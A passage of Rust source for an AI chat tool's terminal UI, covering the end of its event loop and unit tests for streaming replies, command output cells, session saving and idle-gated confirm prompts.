                                let edited =
                                    with_terminal_released(screen, stream, termination, || {
                                        edit_in_editor(&editor, &text)
                                    })
                                    .await;
                                match edited {
                                    Ok(Ok(edited)) => app.set_composer_text(&edited),
                                    Ok(Err(err)) => app.handle_msg(UiMsg::Notice {
                                        kind: NoticeKind::ToolWarning,
                                        text: format!("Editor failed: {err}"),
                                    }),
                                    Err(err) => {
                                        warn!("Failed to re-enter the alternate screen: {err}")
                                    }
                                }
                            }
                            Err(err) => app.handle_msg(UiMsg::Notice {
                                kind: NoticeKind::ToolWarning,
                                text: err.to_string(),
                            }),
                        }
                        app.schedule_frame();
                    }
                    Some(Command::Redraw) => {
                        if let Err(err) = screen.clear() {
                            warn!("Failed to clear the screen: {err}");
                        }
                        app.schedule_frame();
                    }
                    Some(Command::Rewind(target)) => {
                        if let Some(ctx) = ctx.as_mut() {
                            apply_rewind(app, ctx, target);
                        }
                    }
                    None => {}
                }
                // After the dispatch, not before: an editor's result or a
                // rewind's prefill replaces the composer, and the band
                // must not keep a token range from the line it had.
                app.refresh_palette(ctx.as_ref());
            }
            Step::Msg(Some(msg)) => app.handle_msg(msg),
            Step::Msg(None) => {}
            Step::Frame => {
                // One line per streak of failed frames, not one per frame:
                // a terminal that is gone would otherwise fill the log.
                match screen.draw(|frame| app.render(frame)) {
                    Ok(_) => frame_failing = false,
                    Err(err) => {
                        if !frame_failing {
                            warn!("Failed to draw a frame: {err}");
                        }
                        frame_failing = true;
                    }
                }
                app.frame_drawn();
            }
            Step::Work(done) => match *done {
                Done::Turn(joined) => {
                    let Some(Task::Turn { command, queue, .. }) = task.take() else {
                        continue;
                    };
                    match joined {
                        Ok((mut returned, outcome)) => {
                            // The select is unbiased: a tool's last report
                            // may still sit in the channel next to the join
                            // that won, and the end-of-turn sweep would
                            // otherwise fail its row as unreported.
                            while let Ok(msg) = rx.try_recv() {
                                app.handle_msg(msg);
                            }
                            app.end_turn(command, &outcome);
                            app.sync_from_ctx(&mut returned);
                            app.refresh_palette(Some(&returned));
                            if outcome.exit {
                                quit_requested = true;
                            }
                            reconcile_queue(&mut app.queued, &take_user_messages(&queue));
                            // An `.exit` that ran from the queue ends the
                            // session for the lines behind it as well.
                            if quit_requested {
                                app.drop_queued();
                            }
                            if quit_requested || app.queued.is_empty() {
                                ctx = Some(returned);
                            } else {
                                // What the model did not get runs as turns
                                // of its own, the rest offered to each of
                                // them in turn, on the returned context's
                                // queue: an agent switch during the turn
                                // left the finished turn's behind.
                                let next = app.queued.remove(0);
                                carry_over(&returned.notification_queue, &app.queued);
                                task = Some(start_turn(app, returned, abort, tx, next.text));
                            }
                        }
                        Err(err) => {
                            let late = app.turn_late_output();
                            app.abandon_prompts();
                            return Leave::Lost(err, late);
                        }
                    }
                }
                Done::Exit(joined) => {
                    app.abandon_prompts();
                    return match joined {
                        Ok((_, result, captured)) => Leave::Finished(result, captured),
                        Err(err) => {
                            // The panic's message may still sit in the
                            // channel next to the join that won the select.
                            let mut late = Vec::new();
                            while let Ok(msg) = rx.try_recv() {
                                answer_unattended(msg, &mut late);
                            }
                            Leave::Lost(err, with_late(app.exit_late_output(), late))
                        }
                    };
                }
            },
        }
        for LendJob(job) in app.take_lend_requests() {
            let released = with_terminal_released(screen, stream, termination, || {
                job(&TtyHandles { _private: () })
            })
            .await;
            if let Err(err) = released {
                warn!("Failed to re-enter the alternate screen: {err}");
            }
            app.schedule_frame();
        }
        if quit_requested
            && task.is_none()
            && let Some(ctx) = ctx.take()
        {
            app.begin_exit();
            task = Some(Task::Exit(spawn_exit(ctx, abort.clone(), tx.clone())));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::{ClientConfig, Model};
    use crate::config::{AppState, Input, Session, SessionScope, WorkingMode};
    use crate::events::{Event, Origin};
    use crate::prompt::Prompter;
    use crate::testing::TestConfigDirGuard;
    use crossterm::event::{KeyCode, KeyModifiers, MouseEvent};
    use events::ManualClock;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;
    use serial_test::serial;
    use std::future::Future;

    fn plain_config() -> Arc<AppConfig> {
        Arc::new(AppConfig {
            highlight: false,
            save_shell_history: false,
            ..Default::default()
        })
    }

    fn chat_ctx() -> RequestContext {
        let mut app = AppState::test_default();
        app.config = Arc::new(AppConfig {
            dry_run: true,
            highlight: false,
            save_shell_history: false,
            clients: vec![ClientConfig::default()],
            memory: Some(false),
            workspace_instructions: Some(false),
            stream: true,
            ..Default::default()
        });
        let mut ctx = RequestContext::new(Arc::new(app), WorkingMode::Repl);
        ctx.model = Model::new("openai", "test-model");
        ctx
    }

    struct Harness {
        clock: Arc<ManualClock>,
        app: App,
        terminal: Terminal<TestBackend>,
    }

    impl Harness {
        fn new(width: u16, height: u16, config: Arc<AppConfig>, footer: FooterInfo) -> Self {
            let clock = Arc::new(ManualClock::new());
            let app = App::new(
                Arc::clone(&clock) as Arc<dyn Clock>,
                config,
                Arc::new(PromptMemory::default()),
                footer,
            )
            .unwrap();
            let terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
            Self {
                clock,
                app,
                terminal,
            }
        }

        fn standalone(width: u16, height: u16) -> Self {
            let footer = FooterInfo {
                model: "openai:test-model".to_string(),
                ..FooterInfo::default()
            };
            Self::new(width, height, plain_config(), footer)
        }

        fn for_ctx(ctx: &RequestContext) -> Self {
            Self::new(
                80,
                24,
                Arc::clone(&ctx.app.config),
                FooterInfo::from_ctx(ctx),
            )
        }

        fn render(&mut self) {
            self.terminal.draw(|frame| self.app.render(frame)).unwrap();
        }

        /// `TestBackend` cannot print a zero-width buffer, so the tiny
        /// screens go through `render` instead.
        fn draw(&mut self) -> String {
            self.render();
            self.terminal.backend().to_string()
        }

        fn resize(&mut self, width: u16, height: u16) {
            self.terminal.backend_mut().resize(width, height);
            self.app.handle_input(TermInput::Resize);
        }

        fn press(&mut self, code: KeyCode) -> Option<Command> {
            self.press_with_ctx(code, None)
        }

        /// A key followed by the palette refresh the loop runs after
        /// every input, with the context in hand when `ctx` is given.
        fn press_with_ctx(
            &mut self,
            code: KeyCode,
            ctx: Option<&RequestContext>,
        ) -> Option<Command> {
            let command = self.app.handle_key(KeyEvent::new(code, KeyModifiers::NONE));
            self.app.refresh_palette(ctx);
            command
        }

        fn type_text(&mut self, text: &str) {
            for c in text.chars() {
                self.press(KeyCode::Char(c));
            }
        }
    }

    /// Seats the UI's sink and prompter on `ctx` the way `run` does and
    /// hands back the loop's inbox.
    fn seat_tui(ctx: &mut RequestContext) -> (UnboundedSender<UiMsg>, UnboundedReceiver<UiMsg>) {
        let (tx, rx) = unbounded_channel();
        ctx.ui = Arc::new(TuiSink::new(tx.clone()));
        ctx.prompter = Arc::new(TuiPrompter::new(
            tx.clone(),
            Arc::new(AtomicBool::new(false)),
        ));
        (tx, rx)
    }

    fn confirm_request(tool: Option<&str>) -> PromptRequest {
        PromptRequest {
            tool: tool.map(str::to_string),
            ..PromptRequest::new(
                PromptAction::Confirm,
                "Proceed? tui-x7x",
                Origin::detached(),
            )
        }
    }

    /// How long a test waits for an asker's answer before it is declared
    /// stuck; the alternative is a test that never ends.
    const ASKER_WAIT: Duration = Duration::from_secs(5);

    /// A prompt asked on its own thread; `join` is bounded by
    /// `ASKER_WAIT`.
    struct Asker {
        answer: mpsc::Receiver<Result<PromptAnswer>>,
        thread: std::thread::JoinHandle<()>,
    }

    impl Asker {
        fn is_finished(&self) -> bool {
            self.thread.is_finished()
        }

        fn join(self) -> std::thread::Result<Result<PromptAnswer>> {
            match self.answer.recv_timeout(ASKER_WAIT) {
                Ok(answer) => self.thread.join().map(|()| answer),
                Err(mpsc::RecvTimeoutError::Timeout) => {
                    panic!("the asker got no answer within {ASKER_WAIT:?}")
                }
                Err(mpsc::RecvTimeoutError::Disconnected) => Err(self
                    .thread
                    .join()
                    .expect_err("a thread that sent no answer panicked")),
            }
        }
    }

    /// Asks through the prompter on its own thread, the way a tool would,
    /// and delivers the request to the app.
    fn ask_on_a_thread(harness: &mut Harness, req: PromptRequest) -> Asker {
        let (tx, mut rx) = unbounded_channel();
        let prompter = TuiPrompter::new(tx, Arc::new(AtomicBool::new(false)));
        let (answer_tx, answer) = mpsc::channel();
        let thread = std::thread::spawn(move || {
            let _ = answer_tx.send(prompter.prompt(req));
        });
        let msg = rx.blocking_recv().expect("the prompter sends the request");
        harness.app.handle_msg(msg);
        Asker { answer, thread }
    }

    fn duplicated_adjacent_rows(rendered: &str) -> usize {
        let rows: Vec<&str> = rendered
            .lines()
            .map(str::trim_end)
            .filter(|row| !row.trim_matches(['"', ' ']).is_empty())
            .collect();
        rows.windows(2).filter(|pair| pair[0] == pair[1]).count()
    }

    /// Snapshots a frame that shows the welcome block. The version in
    /// its wordmark changes with every release, so the row is folded to
    /// a fixed text together with the padding that follows it, which
    /// would otherwise shift with the version's length.
    fn assert_welcome_snapshot(name: &str, frame: &str) {
        insta::with_settings!(
            { filters => vec![(r"coyote \S+ +", "coyote X.Y.Z ")] },
            { insta::assert_snapshot!(name, frame) }
        );
    }

    /// How long a `run_async` body may take before the test is declared
    /// stuck; a turn that waits on a reply that never comes would
    /// otherwise hang the whole binary.
    const RUN_ASYNC_WAIT: Duration = Duration::from_secs(60);

    /// Drives a turn on a runtime whose workers have the stack headroom
    /// `run_repl_command` needs in debug builds; a default 2 MiB worker
    /// overflows and aborts the whole test binary. The body is bounded
    /// by `RUN_ASYNC_WAIT`.
    fn run_async<F>(f: F) -> F::Output
    where
        F: Future + Send,
        F::Output: Send,
    {
        const STACK: usize = 8 * 1024 * 1024;
        std::thread::scope(|scope| {
            std::thread::Builder::new()
                .stack_size(STACK)
                .spawn_scoped(scope, || {
                    tokio::runtime::Builder::new_multi_thread()
                        .worker_threads(2)
                        .thread_stack_size(STACK)
                        .enable_all()
                        .build()
                        .unwrap()
                        .block_on(async {
                            tokio::time::timeout(RUN_ASYNC_WAIT, f)
                                .await
                                .unwrap_or_else(|_| {
                                    panic!("the async test body did not finish within {RUN_ASYNC_WAIT:?}")
                                })
                        })
                })
                .unwrap()
                .join()
                .unwrap()
        })
    }

    /// Tool output that never breaks its line keeps only its newest
    /// text, the same bound the late-output cell has.
    #[test]
    fn a_newline_free_tool_stream_keeps_a_bounded_tail() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness
            .app
            .append_tool_output(Some("c1".to_string()), b"head-m3z-");
        harness.app.append_tool_output(
            Some("c1".to_string()),
            "y".repeat(LATE_OUTPUT_LIMIT).as_bytes(),
        );
        harness
            .app
            .append_tool_output(Some("c1".to_string()), "tail-m3z".as_bytes());
        let Some(Cell::Text { lines, .. }) = harness.app.transcript.cells().last() else {
            panic!("the tool output did not land in a text cell");
        };
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].len(), LATE_OUTPUT_LIMIT);
        assert!(
            lines[0].ends_with("tail-m3z"),
            "the newest text was dropped"
        );
        assert!(!lines[0].contains("head-m3z"), "the oldest text was kept");
    }

    /// Keys a confirm ignores are still typing: five of them at 200 ms
    /// spacing after the modal appears keep the gate armed, so a `y` at
    /// 1.2 s (past the modal's own second) is dropped, and the same `y`
    /// answers once a full idle second has passed since the last key.
    #[test]
    fn typing_a_confirm_ignores_keeps_the_hotkey_gate_armed() {
        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        for _ in 0..5 {
            harness.clock.advance(Duration::from_millis(200));
            assert_eq!(harness.press(KeyCode::Char('x')), None);
        }
        harness.clock.advance(Duration::from_millis(200));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "a hotkey right after ignored typing answered the modal"
        );
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    #[test]
    fn text_deltas_grow_the_live_reply_in_place() {
        let mut harness = Harness::standalone(80, 24);
        harness
            .app
            .handle_msg(UiMsg::UsageUpdated("\x1b[36m[low] \x1b[0m".to_string()));
        harness.app.begin_turn("tell me a story", false);
        for (i, delta) in [
            "Once upon a **time**",
            " there was a paragraph.\n\nThen a second one,",
            " still arriving.",
        ]
        .into_iter()
        .enumerate()
        {
            harness.app.handle_msg(UiMsg::TextDelta(delta.to_string()));
            let rendered = harness.draw();
            insta::assert_snapshot!(format!("text_delta_{}", i + 1), rendered);
        }
        assert_eq!(harness.app.transcript.len(), 2);
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Assistant { source, done: false, .. }
                if source.ends_with("second one, still arriving.")
        ));
        harness.app.handle_msg(UiMsg::StreamDone);
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Assistant { done: true, .. }
        ));
    }

    /// The harness reports from other test threads land in the fd capture
    /// too, so the captured text is dropped before the final frame.
    #[test]
    #[serial]
    fn a_dry_run_turn_streams_into_the_transcript() {
        run_async(async {
            let _guard = TestConfigDirGuard::new("tui-stream");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn("hello", false);
            let mut handle = spawn_turn(ctx, create_abort_signal(), "hello".to_string(), tx);

            let mut first_delta = None;
            let (mut returned, outcome) = loop {
                tokio::select! {
                    biased;
                    Some(msg) = rx.recv() => {
                        let delta = matches!(msg, UiMsg::TextDelta(_));
                        harness.app.handle_msg(msg);
                        if delta {
                            let rendered = harness.draw();
                            if first_delta.is_none() {
                                first_delta = Some(rendered);
                            }
                        }
                    }
                    joined = &mut handle => break joined.unwrap(),
                }
            };
            while let Ok(msg) = rx.try_recv() {
                harness.app.handle_msg(msg);
            }
            let first_delta = first_delta.expect("the dry run streamed at least one delta");
            insta::assert_snapshot!("stream_first_delta", first_delta);

            assert!(!outcome.exit);
            assert_eq!(outcome.error, None);
            harness.app.end_turn(
                false,
                &TurnOutcome {
                    captured: String::new(),
                    ..outcome
                },
            );
            harness.app.sync_from_ctx(&mut returned);
            let final_frame = harness.draw();
            insta::assert_snapshot!("stream_final", &final_frame);
            // What tells the two frames apart: the status row shows the
            // running turn under the first delta and is empty once the
            // turn has ended.
            assert!(first_delta.contains("Working"), "{first_delta}");
            assert!(first_delta.contains("Esc to interrupt"), "{first_delta}");
            assert!(!final_frame.contains("Working"), "{final_frame}");
            assert!(!final_frame.contains("Esc to interrupt"), "{final_frame}");
            assert!(matches!(
                harness.app.transcript.cells().last(),
                Some(Cell::Assistant { source, done: true, .. }) if source.contains("hello")
            ));
        });
    }

    /// Under the test harness `print!` is diverted into libtest's own
    /// buffer before it reaches fd 1, so the command's text cannot be seen
    /// here; the pty test on the binary pins that. This pins the turn's
    /// shape: it runs the REPL command, ends clean and leaves one cell.
    #[test]
    #[serial]
    fn a_command_turn_becomes_one_preformatted_cell() {
        run_async(async {
            let _guard = TestConfigDirGuard::new("tui-info");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn(".info", true);
            let (mut returned, outcome) =
                spawn_turn(ctx, create_abort_signal(), ".info".to_string(), tx)
                    .await
                    .unwrap();
            while let Ok(msg) = rx.try_recv() {
                harness.app.handle_msg(msg);
            }
            assert_eq!(outcome.error, None);
            harness.app.end_turn(true, &outcome);
            harness.app.sync_from_ctx(&mut returned);

            let commands: Vec<&Cell> = harness
                .app
                .transcript
                .cells()
                .iter()
                .filter(|cell| matches!(cell, Cell::Command { .. }))
                .collect();
            assert_eq!(commands.len(), 1);
            let Cell::Command { name, .. } = commands[0] else {
                unreachable!()
            };
            assert_eq!(name, ".info");
            assert!(harness.app.turn.is_none());
            let rendered = harness.draw();
            assert!(rendered.contains("> .info"), "{rendered}");
        });
    }

    /// The `.info` listing reaches its cell as printed: label column,
    /// value column, model row first. (Under libtest the turn's `print!`
    /// never reaches the fd capture, so the listing is taken from the
    /// context directly; the pty case pins the capture on the binary.)
    #[test]
    #[serial]
    fn the_info_listing_keeps_its_rows_in_the_command_cell() {
        let _guard = TestConfigDirGuard::new("tui-info-rows");
        let ctx = chat_ctx();
        let info = ctx.info(&ctx.app.config).unwrap();
        let model_row = info
            .lines()
            .find(|row| row.starts_with("model "))
            .expect("the listing has a model row");
        assert!(model_row.contains("openai:test-model"), "{model_row:?}");

        // Tall enough to hold the whole listing, so no row scrolls off.
        let mut harness = Harness::new(
            100,
            80,
            Arc::clone(&ctx.app.config),
            FooterInfo::from_ctx(&ctx),
        );
        harness.app.begin_turn(".info", true);
        harness.app.end_turn(
            true,
            &TurnOutcome {
                captured: info.clone(),
                ..TurnOutcome::default()
            },
        );
        let Some(Cell::Command { output, .. }) = harness.app.transcript.cells().last() else {
            panic!("the command turn left no Command cell");
        };
        assert_eq!(output, &info);
        let rendered = harness.draw();
        assert!(rendered.contains(model_row), "{rendered}");
    }

    /// A command's output is painted as it came: an aligned column stays
    /// aligned and a row wider than the screen is clipped, not wrapped.
    #[test]
    fn command_output_keeps_its_columns_and_clips() {
        let mut harness = Harness::standalone(100, 30);
        harness.app.begin_turn(".info", true);
        let wide = "x".repeat(120);
        let output = format!(
            "model                         openai:test-model\n\
             temperature                   -\n\
             \x1b[1mbold_key\x1b[0m                      value\n\
             {wide}\n"
        );
        harness.app.end_turn(
            true,
            &TurnOutcome {
                exit: false,
                error: None,
                captured: output,
            },
        );
        let rendered = harness.draw();
        insta::assert_snapshot!("info_command_cell_100x30", &rendered);
        assert!(rendered.contains("\"model                         openai:test-model"));
        assert_eq!(duplicated_adjacent_rows(&rendered), 0);
    }

    #[test]
    #[serial]
    fn exit_session_asks_to_save_through_the_modal() {
        run_async(async {
            let guard = TestConfigDirGuard::new("tui-exit");
            let mut ctx = chat_ctx();
            let (tx, mut rx) = seat_tui(&mut ctx);
            let mut session = Session::default();
            session.set_name("tui-exit-x7x".to_string());
            session.set_save_session(None);
            session.mark_dirty();
            ctx.session = Some(session);
            let sessions_dir = ctx.sessions_dir_for(SessionScope::Global);
            assert!(sessions_dir.starts_with(&guard.path));
            let mut harness = Harness::for_ctx(&ctx);
            harness.app.begin_turn(".exit session", true);
            let mut handle =
                spawn_turn(ctx, create_abort_signal(), ".exit session".to_string(), tx);

            loop {
                tokio::select! {
                    biased;
                    Some(msg) = rx.recv() => {
                        let prompt = matches!(msg, UiMsg::Prompt { .. });
                        harness.app.handle_msg(msg);
                        if prompt {
                            break;
                        }
                    }
                    joined = &mut handle => panic!("the turn ended without asking: {:?}", joined.unwrap().1),
                }
            }
            let prompt = harness.app.prompts.front().unwrap();
            assert_eq!(prompt.req.question, "Save session?");
            assert_eq!(
                prompt.kind(),
                ModalKind::Confirm {
                    default: false,
                    tool: false
                }
            );
            insta::assert_snapshot!("exit_session_save_modal", harness.draw());

            harness.clock.advance(HOTKEY_IDLE);
            assert_eq!(harness.press(KeyCode::Char('y')), None);
            assert!(harness.app.prompts.is_empty());
            let (_returned, outcome) = handle.await.unwrap();
            assert!(!outcome.exit);
            assert_eq!(outcome.error, None);
            assert!(
                sessions_dir.join("tui-exit-x7x.yaml").is_file(),
                "{outcome:?}"
            );
        });
    }

    /// A tool sleeping on the work task never stalls the composer, even on
    /// a runtime with a single worker: the frame timer fires, and the keys
    /// and a resize handled meanwhile are drawn, while the tool is still
    /// running. The tool goes through `spawn_work` like a real turn; had
    /// it sat on the lone worker, the time driver would wait out the whole
    /// sleep and the frame with it.
    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
    #[serial]
    async fn the_composer_stays_responsive_while_a_tool_sleeps() {
        use crate::function::{ToolIo, run_llm_function};
        use std::collections::HashMap;
        use std::fs;
        use std::os::unix::fs::PermissionsExt;

        const SLEEP: Duration = Duration::from_secs(2);
        let _guard = TestConfigDirGuard::new("tui-sleep");
        let bin = crate::config::paths::functions_bin_dir();
        fs::create_dir_all(&bin).unwrap();
        let tool = bin.join("sleep_x7x");
        fs::write(
            &tool,
            format!("#!/usr/bin/env bash\nsleep {}\n", SLEEP.as_secs()),
        )
        .unwrap();
        fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).unwrap();

        // The frame timer is what is under test, so the app runs on the
        // real clock rather than the harness's manual one.
        let footer = FooterInfo {
            model: "openai:test-model".to_string(),
            ..FooterInfo::default()
        };
        let mut app = App::new(
            Arc::new(SystemClock),
            plain_config(),
            Arc::new(PromptMemory::default()),
            footer,
        )
        .unwrap();
        let mut terminal = Terminal::new(TestBackend::new(80, 24)).unwrap();
        let (tx, _rx) = unbounded_channel();
        app.begin_turn("run the tool", false);
        let started = Instant::now();
        let handle = spawn_work(async move {
            run_llm_function(
                "sleep_x7x".to_string(),
                vec![],
                HashMap::from([("TERM".to_string(), "dumb".to_string())]),
                None,
                None,
                ToolIo::new(Arc::new(TuiSink::new(tx)), None, 0),
                None,
            )
        });

        for c in "hello".chars() {
            app.handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::NONE));
        }
        terminal.backend_mut().resize(60, 20);
        app.handle_input(TermInput::Resize);
        app.schedule_frame();
        app.frames.next_frame().await;
        let frame_at = started.elapsed();
        assert!(
            frame_at < SLEEP / 4,
            "the frame waited {frame_at:?} on the sleeping tool"
        );
        assert!(!handle.is_finished(), "the tool finished in {frame_at:?}");
        terminal.draw(|frame| app.render(frame)).unwrap();
        app.frames.frame_drawn();
        let rendered = terminal.backend().to_string();
        assert_eq!(app.composer_text(), "hello");
        // The app runs on the real clock here, so the elapsed seconds in
        // the status row depend on the host's speed.
        // Width-preserving: the clock's digit becomes `N`, so the row keeps
        // its length and the snapshot its columns.
        insta::with_settings!({ filters => vec![(r"Working \. \d+s", "Working . Ns")] }, {
            insta::assert_snapshot!("sleeping_tool_composer_responsive_60x20", rendered);
        });

        handle.await.unwrap().unwrap();
        assert!(started.elapsed() >= SLEEP);
    }

    #[test]
    fn confirm_modal_hotkeys_answer_the_asking_thread() {
        for (key, expected) in [
            (KeyCode::Char('y'), PromptAnswer::Confirmed(true)),
            (KeyCode::Char('n'), PromptAnswer::Confirmed(false)),
            (KeyCode::Esc, PromptAnswer::Cancelled),
            (KeyCode::Enter, PromptAnswer::Confirmed(true)),
        ] {
            let mut harness = Harness::standalone(80, 24);
            let asker = ask_on_a_thread(&mut harness, confirm_request(None));
            // The gate counts from the modal's appearance.
            harness.clock.advance(HOTKEY_IDLE);
            assert_eq!(harness.press(key), None);
            assert_eq!(asker.join().unwrap().unwrap(), expected, "{key:?}");
            assert!(harness.app.prompts.is_empty());
        }
    }

    /// A user idle for longer than the gate who taps a hotkey just as the
    /// modal comes up has not seen it: the gate counts from the modal's
    /// appearance, so the tap is dropped and the same key answers once
    /// the modal has been up for `HOTKEY_IDLE`. Esc stays exempt.
    #[test]
    fn a_hotkey_as_the_modal_appears_is_not_an_answer() {
        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            harness.app.prompts.len(),
            1,
            "the undrawn modal was answered"
        );
        assert!(!asker.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );

        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    }

    #[test]
    fn a_hotkey_right_after_typing_is_not_an_answer() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness.clock.advance(Duration::from_millis(200));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());
        // The dropped `y` was a keystroke too: the idle second counts
        // from it, not from the draft.
        harness.clock.advance(Duration::from_millis(800));
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(harness.app.prompts.len(), 1);
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.composer_text(), "draft");
    }

    /// The gate holds for every modal kind and its answer key: the key
    /// pressed before the question arrives is typing, the key one
    /// millisecond short of the idle second is dropped (and re-arms a
    /// hotkey's gate), and the key at the full second answers. A fresh
    /// modal answered exactly at the second pins the boundary itself;
    /// for the input field, characters typed inside that second do not
    /// move it.
    #[test]
    fn checklist_8_typeahead_and_idle_gate_guard_the_modal() {
        type GateCase = (
            &'static str,
            fn() -> PromptRequest,
            &'static str,
            KeyCode,
            PromptAnswer,
        );
        let input_request = || PromptRequest::new(PromptAction::Input, "Name?", Origin::detached());
        let cases: [GateCase; 3] = [
            (
                "confirm",
                || confirm_request(None),
                "",
                KeyCode::Char('y'),
                PromptAnswer::Confirmed(true),
            ),
            (
                "input",
                input_request,
                "ab",
                KeyCode::Enter,
                PromptAnswer::Text("ab".to_string()),
            ),
            (
                "select",
                || list_request(PromptAction::Select, None),
                "",
                KeyCode::Char('1'),
                PromptAnswer::Selected("alpha".to_string()),
            ),
        ];
        for (kind, request, typed, key, expected) in cases {
            let mut harness = Harness::standalone(80, 24);
            harness.clock.advance(10 * HOTKEY_IDLE);
            assert_eq!(harness.press(key), None, "{kind}");
            let asker = ask_on_a_thread(&mut harness, request());
            harness.type_text(typed);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{kind}: the early key answered"
            );
            assert!(!asker.is_finished(), "{kind}");
            harness
                .clock
                .advance(HOTKEY_IDLE - Duration::from_millis(1));
            assert_eq!(harness.press(key), None);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{kind}: answered a millisecond early"
            );
            assert!(!asker.is_finished(), "{kind}");
            harness.clock.advance(HOTKEY_IDLE);
            assert_eq!(harness.press(key), None);
            assert_eq!(asker.join().unwrap().unwrap(), expected, "{kind}");

            let mut harness = Harness::standalone(80, 24);
            harness.clock.advance(10 * HOTKEY_IDLE);
            let asker = ask_on_a_thread(&mut harness, request());
            harness.type_text(typed);
            harness.clock.advance(HOTKEY_IDLE);
            assert_eq!(harness.press(key), None);
            assert_eq!(
                asker.join().unwrap().unwrap(),
                expected,
                "{kind}: the full second did not answer"
            );
        }

        // A checkbox's Space is held to the same gate: typed ahead it
        // ticks nothing and re-arms, after the idle second it ticks.
        let mut harness = Harness::standalone(80, 24);
        harness.clock.advance(10 * HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        let asker = ask_on_a_thread(&mut harness, list_request(PromptAction::Checkbox, None));
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        assert!(harness.draw().contains("[ ] alpha"));
        harness
            .clock
            .advance(HOTKEY_IDLE - Duration::from_millis(1));
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        assert!(harness.draw().contains("[ ] alpha"));
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char(' ')), None);
        assert!(harness.draw().contains("[x] alpha"));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Checked(vec!["alpha".to_string()])
        );
    }

    /// Answering one question re-arms the idle gate for the next queued
    /// one: a `y` held down or pressed twice answers only the first.
    #[test]
    fn a_hotkey_right_after_answering_does_not_answer_the_next_queued_prompt() {
        let mut harness = Harness::standalone(80, 24);
        let first = ask_on_a_thread(&mut harness, confirm_request(None));
        let second = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
        assert_eq!(harness.app.prompts.len(), 2);

        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            first.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert_eq!(harness.app.prompts.len(), 1);

        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!second.is_finished());

        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            second.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
        assert!(harness.app.prompts.is_empty());
    }

    /// Enter that submits a line is a keystroke for the idle gate: a confirm
    /// raised by the turn just submitted is not answered by a repeated Enter.
    #[test]
    fn enter_right_after_submitting_does_not_answer_a_fresh_confirm() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("call the tool");
        harness.clock.advance(HOTKEY_IDLE);
        assert!(matches!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit(_))
        ));
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.app.prompts.len(), 1);
        assert!(!asker.is_finished());
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A paste while a confirm is up has nowhere visible to go: the modal
    /// has no field and the composer is hidden under it.
    #[test]
    fn a_paste_under_a_confirm_is_dropped() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        let asker = ask_on_a_thread(&mut harness, confirm_request(None));
        harness
            .app
